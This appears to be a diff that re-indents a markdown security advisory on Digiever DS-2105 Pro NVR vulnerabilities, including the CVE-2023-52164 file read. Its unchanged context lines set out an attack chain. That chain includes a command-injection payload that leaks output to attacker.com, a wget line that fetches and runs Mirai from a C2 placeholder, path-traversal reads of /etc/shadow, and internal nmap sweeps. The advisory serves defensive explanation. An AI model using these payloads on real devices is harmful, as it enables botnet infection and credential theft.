@@ -56,10 +56,10 @@ The Digiever DS-2105 Pro NVR suffers from **two critical vulnerabilities** that 
 - **Affected Component**: Web interface file handling
 - **Root Cause**: Path traversal vulnerability allows reading files outside web root
 - **Impact**: Attackers can read sensitive files including:
-  - `/etc/passwd`, `/etc/shadow` (credential files)
-  - Configuration files with admin passwords
-  - SSL/TLS private keys
-  - Video surveillance metadata
+    - `/etc/passwd`, `/etc/shadow` (credential files)
+    - Configuration files with admin passwords
+    - SSL/TLS private keys
+    - Video surveillance metadata
 
 ### Root Cause Analysis
 
@@ -98,20 +98,20 @@ The Digiever DS-2105 Pro NVR suffers from **two critical vulnerabilities** that 
 
 1. **Mass Scanning for Exposed NVRs**  
    Attacker identifies vulnerable Digiever DS-2105 Pro NVRs using internet-wide scanning:
-   - **Shodan/Censys queries**: `"Digiever" "DS-2105"`, `product:"Digiever NVR"`
-   - **Port scanning**: Scan for common NVR ports (80/tcp, 443/tcp, 8080/tcp)
-   - **Banner grabbing**: HTTP headers reveal "Digiever" or "DS-2105 Pro" in responses
-   - **Automated tools**: Masscan, ZMap scan entire IPv4 space for exposed devices
-   
-   Attacker compiles list of thousands of exposed NVRs: 203.0.113.50, 198.51.100.100, etc.
+    - **Shodan/Censys queries**: `"Digiever" "DS-2105"`, `product:"Digiever NVR"`
+    - **Port scanning**: Scan for common NVR ports (80/tcp, 443/tcp, 8080/tcp)
+    - **Banner grabbing**: HTTP headers reveal "Digiever" or "DS-2105 Pro" in responses
+    - **Automated tools**: Masscan, ZMap scan entire IPv4 space for exposed devices
+    
+    Attacker compiles list of thousands of exposed NVRs: 203.0.113.50, 198.51.100.100, etc.
 
 2. **Vulnerability Fingerprinting**  
    Attacker confirms presence of vulnerable endpoints:
-   - **Probe CGI endpoint**: Send GET request to `/cgi-bin/time_tzsetup.cgi`
-   - **Version detection**: Check HTTP response headers, login page HTML for version strings
-   - **Vulnerability confirmation**: Test for unauthenticated access to admin functions
-   
-   Device at `203.0.113.50` responds to `time_tzsetup.cgi` without authentication → Vulnerable.
+    - **Probe CGI endpoint**: Send GET request to `/cgi-bin/time_tzsetup.cgi`
+    - **Version detection**: Check HTTP response headers, login page HTML for version strings
+    - **Vulnerability confirmation**: Test for unauthenticated access to admin functions
+    
+    Device at `203.0.113.50` responds to `time_tzsetup.cgi` without authentication → Vulnerable.
 
 3. **Command Injection Testing**  
    Attacker crafts malicious payload to test command injection:
@@ -120,8 +120,8 @@ The Digiever DS-2105 Pro NVR suffers from **two critical vulnerabilities** that 
    curl -X POST "http://203.0.113.50/cgi-bin/time_tzsetup.cgi" \
      -d "timezone=UTC; nslookup test-$(whoami).attacker.com"
    ```
-   - Attacker's DNS server receives query: `test-root.attacker.com`
-   - Confirms command executed as **root user**
+    - Attacker's DNS server receives query: `test-root.attacker.com`
+    - Confirms command executed as **root user**
 
 4. **Malware Deployment**  
    Attacker deploys **Mirai or ShadowV2 botnet malware**:
@@ -132,27 +132,27 @@ The Digiever DS-2105 Pro NVR suffers from **two critical vulnerabilities** that 
    
    timezone=UTC; cd /tmp; wget http://[C2_SERVER]/bins/mirai.arm -O mirai; chmod 777 mirai; ./mirai
    ```
-   - **Download**: Fetches Mirai binary compiled for ARM architecture (common in NVRs)
-   - **Execute**: Runs malware with root privileges
-   - **Persistence**: Mirai adds itself to startup scripts for persistence after reboots
+    - **Download**: Fetches Mirai binary compiled for ARM architecture (common in NVRs)
+    - **Execute**: Runs malware with root privileges
+    - **Persistence**: Mirai adds itself to startup scripts for persistence after reboots
 
 5. **Botnet Conscription**  
    Compromised NVR joins botnet network:
-   - **C2 Registration**: Mirai connects to command-and-control server, registers new bot
-   - **Awaits Commands**: Listens for instructions (DDoS targets, scanning orders, propagation)
-   - **DDoS Participation**: Participates in distributed denial-of-service attacks against targets
-   - **Scanning**: Scans internet for additional vulnerable devices to infect
-   
-   NVR now part of botnet with thousands of compromised IoT devices.
+    - **C2 Registration**: Mirai connects to command-and-control server, registers new bot
+    - **Awaits Commands**: Listens for instructions (DDoS targets, scanning orders, propagation)
+    - **DDoS Participation**: Participates in distributed denial-of-service attacks against targets
+    - **Scanning**: Scans internet for additional vulnerable devices to infect
+    
+    NVR now part of botnet with thousands of compromised IoT devices.
 
 6. **Surveillance System Compromise**  
    Attacker accesses video surveillance functionality:
-   - **Live feed access**: Views real-time camera feeds from all connected cameras
-   - **Recording access**: Downloads historical video footage
-   - **Privacy violation**: Surveillance of physical premises, employee activities, customer behavior
-   - **Footage manipulation**: Deletes or alters recordings (evidence tampering)
-   
-   Attacker gains intelligence on physical security, layouts, personnel.
+    - **Live feed access**: Views real-time camera feeds from all connected cameras
+    - **Recording access**: Downloads historical video footage
+    - **Privacy violation**: Surveillance of physical premises, employee activities, customer behavior
+    - **Footage manipulation**: Deletes or alters recordings (evidence tampering)
+    
+    Attacker gains intelligence on physical security, layouts, personnel.
 
 7. **Credential Harvesting (CVE-2023-52164)**  
    Attacker exploits arbitrary file read vulnerability:
@@ -163,29 +163,29 @@ The Digiever DS-2105 Pro NVR suffers from **two critical vulnerabilities** that 
    # Extract admin credentials from config
    curl "http://203.0.113.50/cgi-bin/[vulnerable_endpoint]?file=../../../../etc/digiever/config.xml"
    ```
-   - **Password hashes**: Extracted from `/etc/shadow`, cracked offline
-   - **Configuration secrets**: Admin passwords, network credentials stored in cleartext
-   - **SSL keys**: Private keys for HTTPS, VPN configurations
+    - **Password hashes**: Extracted from `/etc/shadow`, cracked offline
+    - **Configuration secrets**: Admin passwords, network credentials stored in cleartext
+    - **SSL keys**: Private keys for HTTPS, VPN configurations
 
 8. **Lateral Movement Preparation**  
    Attacker uses compromised NVR as pivot point:
-   - **Network reconnaissance**: Scan internal network from NVR's vantage point
-     ```bash
-     nmap -sn 192.168.1.0/24
-     nmap -sV -p 22,80,443,445,3389 192.168.1.0/24
-     ```
-   - **ARP spoofing**: Position NVR for man-in-the-middle attacks on local network
-   - **Credential reuse**: Test harvested credentials against other internal systems
-   - **Tunnel establishment**: Set up reverse SSH tunnel or VPN for persistent access
+    - **Network reconnaissance**: Scan internal network from NVR's vantage point
+      ```bash
+      nmap -sn 192.168.1.0/24
+      nmap -sV -p 22,80,443,445,3389 192.168.1.0/24
+      ```
+    - **ARP spoofing**: Position NVR for man-in-the-middle attacks on local network
+    - **Credential reuse**: Test harvested credentials against other internal systems
+    - **Tunnel establishment**: Set up reverse SSH tunnel or VPN for persistent access
 
 9. **Enterprise Network Infiltration**  
    Attacker moves from NVR to corporate network:
-   - **SMB exploitation**: Attack Windows file servers on same network
-   - **RDP brute force**: Target Windows systems with harvested/cracked credentials
-   - **IoT device compromise**: Pivot to other vulnerable IoT devices (IP cameras, building management)
-   - **OT system access**: If NVR on operational technology (OT) network, attack industrial control systems
-   
-   Attacker escalates from surveillance system to full enterprise compromise.
+    - **SMB exploitation**: Attack Windows file servers on same network
+    - **RDP brute force**: Target Windows systems with harvested/cracked credentials
+    - **IoT device compromise**: Pivot to other vulnerable IoT devices (IP cameras, building management)
+    - **OT system access**: If NVR on operational technology (OT) network, attack industrial control systems
+    
+    Attacker escalates from surveillance system to full enterprise compromise.
 
 10. **Persistence and Propagation**  
     Attacker maintains long-term access:
@@ -201,45 +201,49 @@ The Digiever DS-2105 Pro NVR suffers from **two critical vulnerabilities** that 
 
 === "Confidentiality" 
     Complete loss of surveillance privacy and confidential data:
-        - **Video footage access**: Attackers view real-time and recorded video from all connected cameras, exposing sensitive activities, personnel, customers, and proprietary operations
-        - **Credential theft**: Admin passwords, network credentials, and user accounts extracted via CVE-2023-52164 arbitrary file read
-        - **Configuration exposure**: Network topology, VLAN configurations, connected camera details, and security settings revealed
-        - **Intelligence gathering**: Attackers map physical layouts, identify security vulnerabilities in physical premises, and gather business intelligence
-        - **Compliance violations**: Exposure of video surveillance data may violate GDPR, HIPAA, CCPA, or industry regulations
-    
-        Confidentiality breach extends beyond NVR to entire monitored environment.
+
+    - **Video footage access**: Attackers view real-time and recorded video from all connected cameras, exposing sensitive activities, personnel, customers, and proprietary operations
+    - **Credential theft**: Admin passwords, network credentials, and user accounts extracted via CVE-2023-52164 arbitrary file read
+    - **Configuration exposure**: Network topology, VLAN configurations, connected camera details, and security settings revealed
+    - **Intelligence gathering**: Attackers map physical layouts, identify security vulnerabilities in physical premises, and gather business intelligence
+    - **Compliance violations**: Exposure of video surveillance data may violate GDPR, HIPAA, CCPA, or industry regulations
+
+    Confidentiality breach extends beyond NVR to entire monitored environment.
 
 === "Integrity" 
     Attackers can manipulate surveillance data and device configurations:
-        - **Footage tampering**: Delete or modify video recordings to conceal criminal activity, sabotage evidence
-        - **Configuration changes**: Alter camera settings, recording schedules, motion detection thresholds to disable surveillance
-        - **Malware installation**: Deploy persistent backdoors, botnet malware, or ransomware on NVR
-        - **Firmware corruption**: Overwrite firmware with malicious versions (if writable)
-        - **Log manipulation**: Delete authentication logs, access logs to hide exploitation tracks
-        - **False feeds**: Inject fake video streams or loop recordings to deceive monitoring personnel
 
-        Integrity violations undermine trust in surveillance systems as security tools.
+    - **Footage tampering**: Delete or modify video recordings to conceal criminal activity, sabotage evidence
+    - **Configuration changes**: Alter camera settings, recording schedules, motion detection thresholds to disable surveillance
+    - **Malware installation**: Deploy persistent backdoors, botnet malware, or ransomware on NVR
+    - **Firmware corruption**: Overwrite firmware with malicious versions (if writable)
+    - **Log manipulation**: Delete authentication logs, access logs to hide exploitation tracks
+    - **False feeds**: Inject fake video streams or loop recordings to deceive monitoring personnel
+
+    Integrity violations undermine trust in surveillance systems as security tools.
 
 === "Availability"
     Device functionality and surveillance operations disrupted:
-        - **Botnet conscription**: NVR resources consumed by DDoS attacks, degrading legitimate surveillance functions
-        - **Device bricking**: Malicious firmware updates or configuration changes render NVR inoperable
-        - **Denial of service**: Resource exhaustion attacks (CPU, memory, disk) prevent recording or streaming
-        - **Network disruption**: Compromised NVR used to attack other devices on local network, causing widespread outages
-        - **Ransomware**: Surveillance recordings encrypted and held for ransom
-        - **Physical security impact**: Disabled surveillance during security incidents leaves blind spots for physical threats
+    
+    - **Botnet conscription**: NVR resources consumed by DDoS attacks, degrading legitimate surveillance functions
+    - **Device bricking**: Malicious firmware updates or configuration changes render NVR inoperable
+    - **Denial of service**: Resource exhaustion attacks (CPU, memory, disk) prevent recording or streaming
+    - **Network disruption**: Compromised NVR used to attack other devices on local network, causing widespread outages
+    - **Ransomware**: Surveillance recordings encrypted and held for ransom
+    - **Physical security impact**: Disabled surveillance during security incidents leaves blind spots for physical threats
 
-        Availability loss creates windows of opportunity for physical security breaches.
+    Availability loss creates windows of opportunity for physical security breaches.
 
 === "Scope"
     NVR compromise often gateway to broader network infiltration:
-        - **Trusted network position**: NVRs typically on internal networks with access to other systems
-        - **Credential reuse**: Harvested credentials often work on other corporate systems (Active Directory, servers)
-        - **Network segmentation failures**: Many deployments lack proper VLAN isolation, allowing NVR-to-corporate network communication
-        - **IoT ecosystem access**: Compromised NVR can attack other IoT devices (cameras, access control, HVAC, building management)
-        - **OT/ICS infiltration**: In industrial settings, NVR compromise may provide path to operational technology networks controlling physical processes
 
-        Initial compromise scope limited to NVR but rapidly expands to enterprise-wide impact.
+    - **Trusted network position**: NVRs typically on internal networks with access to other systems
+    - **Credential reuse**: Harvested credentials often work on other corporate systems (Active Directory, servers)
+    - **Network segmentation failures**: Many deployments lack proper VLAN isolation, allowing NVR-to-corporate network communication
+    - **IoT ecosystem access**: Compromised NVR can attack other IoT devices (cameras, access control, HVAC, building management)
+    - **OT/ICS infiltration**: In industrial settings, NVR compromise may provide path to operational technology networks controlling physical processes
+
+    Initial compromise scope limited to NVR but rapidly expands to enterprise-wide impact.
 
 ---
 
